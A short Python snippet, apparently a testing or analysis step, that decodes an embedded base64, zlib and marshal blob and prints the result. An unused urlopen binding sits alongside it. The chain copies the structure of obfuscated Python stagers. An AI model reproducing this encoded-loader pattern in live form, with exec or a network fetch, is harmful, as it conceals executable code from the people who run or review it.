# decompressed payload for testing
import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
print(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3tDTSMzSz0DM21zMysTI0NrbQ1y8uSUxPLSrWzzSN0CuoVNfUK0pNTNHQBAA9xBH5'))))